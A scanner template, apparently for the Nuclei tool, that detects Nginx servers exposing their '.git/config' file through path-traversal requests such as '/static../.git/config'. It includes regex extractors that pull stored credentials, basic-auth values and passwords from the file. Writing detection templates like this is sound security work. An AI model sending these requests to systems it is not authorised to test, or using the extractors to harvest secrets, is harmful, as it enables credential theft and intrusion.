id: ngnix-git

info:
  name: Nginx - Git Configuration Exposure
  author: omkar
  severity: medium
  description: Nginx that exposes the Git configuration due to misconfiguration.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cwe-id: CWE-200
  metadata:
    max-request: 1
  tags: ngnix,config,git,exposure

http:
  - method: GET
    path:
      - "{{BaseURL}}/static../.git/config"
      - "{{BaseURL}}/events../.git/config"
      - "{{BaseURL}}/js../.git/config"
      - "{{BaseURL}}/lib../.git/config"
      - "{{BaseURL}}/content../.git/config"
      - "{{BaseURL}}/css../.git/config"
      - "{{BaseURL}}/img../.git/config"
      - "{{BaseURL}}/images../.git/config"
      - "{{BaseURL}}/media../.git/config"
      - "{{BaseURL}}/assets../.git/config"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "[credentials]"
          - "[core]"
        condition: or

      - type: dsl
        dsl:
          - "!contains(tolower(body), '<html')"
          - "!contains(tolower(body), '<body')"
        condition: and

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - "url ?= ?https?://(.*:.*)@"
          - "AUTHORIZATION: basic (.*)"
          - "pass = (.*)"